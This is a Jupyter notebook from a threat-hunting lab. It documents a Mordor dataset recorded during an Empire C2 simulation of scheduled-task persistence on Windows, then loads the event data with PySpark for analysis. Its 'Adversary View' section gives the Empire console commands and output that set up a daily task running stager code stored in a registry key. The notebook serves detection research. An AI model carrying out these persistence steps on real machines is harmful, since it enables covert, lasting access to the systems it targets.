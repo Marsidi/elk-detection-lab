{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Empire Userland Scheduled Tasks"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| id                | SD-190319024742 |\n",
    "| author            | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| creation date     | 19/03/19 |\n",
    "| platform          | Windows |\n",
    "| Mordor Environment| shire |\n",
    "| Simulation Type   | C2 |\n",
    "| Simulation Tool   | Empire |\n",
    "| Simulation Script | https://github.com/EmpireProject/Empire/blob/dev/data/module_source/persistence/Persistence.psm1 |\n",
    "| Mordor Dataset    | https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/persistence/empire_userland_schtasks.tar.gz |"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents adversaries creating scheduled tasks to maintain persistence in the environment"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "usemodule persistence/userland/schtasks\n",
    "(Empire: powershell/persistence/userland/schtasks) > set Listener https\n",
    "(Empire: powershell/persistence/userland/schtasks) > set TaskName Maintenance\n",
    "(Empire: powershell/persistence/userland/schtasks) > info   \n",
    "\n",
    "              Name: Invoke-Schtasks\n",
    "            Module: powershell/persistence/userland/schtasks\n",
    "        NeedsAdmin: False\n",
    "        OpsecSafe: False\n",
    "          Language: powershell\n",
    "MinLanguageVersion: 2\n",
    "        Background: False\n",
    "  OutputExtension: None\n",
    "\n",
    "Authors:\n",
    "  @mattifestation\n",
    "  @harmj0y\n",
    "\n",
    "Description:\n",
    "  Persist a stager (or script) using schtasks. This has a\n",
    "  moderate detection/removal rating.\n",
    "\n",
    "Comments:\n",
    "  https://github.com/mattifestation/PowerSploit/blob/master/Pe\n",
    "  rsistence/Persistence.psm1\n",
    "\n",
    "Options:\n",
    "\n",
    "  Name       Required    Value                     Description\n",
    "  ----       --------    -------                   -----------\n",
    "  DailyTime  False       09:00                     Daily time to trigger the script        \n",
    "                                                  (HH:mm).                                \n",
    "  ProxyCreds False       default                   Proxy credentials                       \n",
    "                                                  ([domain\\]username:password) to use for \n",
    "                                                  request (default, none, or other).      \n",
    "  ExtFile    False                                 Use an external file for the payload    \n",
    "                                                  instead of a stager.                    \n",
    "  Cleanup    False                                 Switch. Cleanup the trigger and any     \n",
    "                                                  script from specified location.         \n",
    "  TaskName   True        Maintenance               Name to use for the schtask.            \n",
    "  IdleTime   False                                 User idle time (in minutes) to trigger  \n",
    "                                                  script.                                 \n",
    "  ADSPath    False                                 Alternate-data-stream location to store \n",
    "                                                  the script code.                        \n",
    "  Agent      True        FD6A3MGY                  Agent to run module on.                 \n",
    "  Listener   False       https                     Listener to use.                        \n",
    "  RegPath    False       HKCU:\\Software\\Microsoft  Registry location to store the script   \n",
    "                        \\Windows\\CurrentVersion\\  code. Last element is the key name.     \n",
    "                        debug                   \n",
    "  Proxy      False       default                   Proxy to use for request (default, none,\n",
    "                                                  or other).                              \n",
    "  UserAgent  False       default                   User-agent string to use for the staging\n",
    "                                                  request (default, none, or other).      \n",
    "\n",
    "(Empire: powershell/persistence/userland/schtasks) > execute\n",
    "[>] Module is not opsec safe, run? [y/N] y\n",
    "[*] Tasked FD6A3MGY to run TASK_CMD_WAIT\n",
    "[*] Agent FD6A3MGY tasked with task ID 11\n",
    "[*] Tasked agent FD6A3MGY to run module powershell/persistence/userland/schtasks\n",
    "(Empire: powershell/persistence/userland/schtasks) > SUCCESS: The scheduled task \"Maintenance\" has successfully been created.\n",
    "Schtasks persistence established using listener https stored in HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\debug with Maintenance daily trigger at 09:00.\n",
    "\n",
    "(Empire: powershell/persistence/userland/schtasks) >\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Explore Mordor Dataset"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Initialize Analytics Engine"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from openhunt.mordorutils import *\n",
    "spark = get_spark()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Download & Process Mordor File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "mordor_file = \"https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/persistence/empire_userland_schtasks.tar.gz\"\n",
    "registerMordorSQLTable(spark, mordor_file, \"mordorTable\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Get to know your data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "df = spark.sql(\n",
    "    '''\n",
    "SELECT channel, COUNT(1)\n",
    "FROM mordorTable\n",
    "GROUP BY channel\n",
    "    '''\n",
    ")\n",
    "df.show(10,False)\n",
    "        "
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 4
}
